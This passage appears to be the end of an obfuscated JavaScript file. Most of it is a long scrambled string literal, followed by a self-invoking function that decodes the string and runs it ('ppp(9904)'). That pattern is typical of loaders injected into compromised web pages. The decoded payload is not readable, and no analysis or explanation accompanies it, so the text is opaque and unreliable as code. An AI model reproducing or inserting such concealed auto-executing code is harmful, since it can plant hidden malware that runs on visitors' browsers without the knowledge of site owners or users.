])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
